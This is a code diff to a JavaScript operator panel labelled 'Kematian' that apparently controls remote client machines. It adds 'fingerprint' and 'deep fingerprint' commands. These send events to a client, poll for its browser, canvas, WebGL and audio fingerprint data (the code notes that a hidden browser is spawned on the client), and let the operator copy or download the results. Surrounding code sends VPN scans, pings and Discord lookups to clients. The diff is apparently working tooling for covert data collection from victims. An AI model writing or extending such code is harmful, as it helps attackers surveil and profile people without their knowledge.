@@ -53,6 +53,14 @@
   const pingBtn      = $("ping-btn");
   const exportBtn    = $("export-btn");
 
+  const fingerprintBtn = $("fingerprint-btn");
+  const fingerprintDeepBtn = $("fingerprint-deep-btn");
+  const fpOverlay    = $("fp-overlay");
+  const fpClose      = $("fp-close");
+  const fpContent    = $("fp-content");
+  const fpCopy       = $("fp-copy");
+  const fpDownload   = $("fp-download");
+
   const discordViewEl   = $("discord-view");
   const dpGrid          = $("dp-grid");
   const enrichAllBtn    = $("enrich-all-btn");
@@ -710,6 +718,53 @@
       throw new Error(msg);
     }
     return data.result;
+  }
+
+  // ── Fingerprint ────────────────────────────────────────────────
+  let fpData = null;
+
+  function showFingerprint(data) {
+    fpData = data;
+    if (fpContent) fpContent.textContent = JSON.stringify(data, null, 2);
+    if (fpOverlay) fpOverlay.style.display = "flex";
+  }
+
+  function closeFingerprint() {
+    if (fpOverlay) fpOverlay.style.display = "none";
+  }
+
+  async function requestFingerprint() {
+    if (!clientId) { log("ERROR: no clientId"); return; }
+    fingerprintBtn.disabled = true;
+    log("Collecting fingerprint…");
+    sendEvent("fingerprint", {});
+    for (let i = 0; i < 8; i++) {
+      await new Promise((r) => setTimeout(r, 400));
+      try {
+        const fp = await rpc("get_fingerprint", { clientId });
+        if (fp && fp.data) { showFingerprint(fp.data); fingerprintBtn.disabled = false; return; }
+      } catch (_) {}
+    }
+    fingerprintBtn.disabled = false;
+    log("Fingerprint not received (client offline or not responding)");
+  }
+
+  async function requestFingerprintDeep() {
+    if (!clientId) { log("ERROR: no clientId"); return; }
+    fingerprintDeepBtn.disabled = true;
+    log("Collecting deep fingerprint (canvas/WebGL/audio)…");
+    sendEvent("fingerprint", {});
+    sendEvent("fingerprint_js", {});
+    // The JS fingerprint spawns a hidden browser (~2-5s), so poll longer.
+    for (let i = 0; i < 15; i++) {
+      await new Promise((r) => setTimeout(r, 500));
+      try {
+        const fp = await rpc("get_fingerprint", { clientId });
+        if (fp && fp.data && fp.jsData) { showFingerprint({ ...fp.data, ...fp.jsData }); fingerprintDeepBtn.disabled = false; return; }
+      } catch (_) {}
+    }
+    fingerprintDeepBtn.disabled = false;
+    log("Deep fingerprint not received (client offline or not responding)");
   }
 
   async function fetchUserRole() {
@@ -2227,6 +2282,8 @@
       sendEvent("scan_vpn", {});
     });
     pingBtn.addEventListener("click", () => { log("Ping sent"); sendEvent("ping", {}); });
+    fingerprintBtn.addEventListener("click", () => requestFingerprint());
+    fingerprintDeepBtn.addEventListener("click", () => requestFingerprintDeep());
     exportBtn.addEventListener("click", async () => {
       try {
         exportBtn.disabled = true;
@@ -2455,6 +2512,18 @@
     log("Ready — Kematian");
     window.__kematianPoll = setInterval(pollEvents, 1500);
     setTimeout(pollEvents, 500);
+
+    // Determine connection status on load: the plugin's one-shot "ready" event
+    // may have been consumed before the UI opened, so fall back to the
+    // server-side "plugin_ready_at" flag recorded on that event.
+    rpc("client_online", { clientId })
+      .then((s) => {
+        if (s && s.online) {
+          statusDot.className = "dot dot-on";
+          statusText.textContent = "Connected";
+        }
+      })
+      .catch(() => {});
   }
 
   // ── Discord lookup buttons ────────────────────────────────────
@@ -2653,6 +2722,20 @@
     try { await exportCurrentTab(); }
     catch (e) { log(`Export error: ${e.message}`); }
     finally { exportTabBtn.disabled = false; }
+  });
+
+  // ── Fingerprint modal controls ────────────────────────────────
+  if (fpClose) fpClose.addEventListener("click", closeFingerprint);
+  if (fpOverlay) fpOverlay.addEventListener("click", (e) => { if (e.target === fpOverlay) closeFingerprint(); });
+  if (fpCopy) fpCopy.addEventListener("click", () => {
+    if (!fpData) return;
+    navigator.clipboard.writeText(JSON.stringify(fpData, null, 2))
+      .then(() => log("Fingerprint copied to clipboard"))
+      .catch(() => log("Copy failed"));
+  });
+  if (fpDownload) fpDownload.addEventListener("click", () => {
+    if (!fpData) return;
+    downloadBlob(new Blob([JSON.stringify(fpData, null, 2)], { type: "application/json" }), "fingerprint.json");
   });
 
   // ── Init ──────────────────────────────────────────────────────
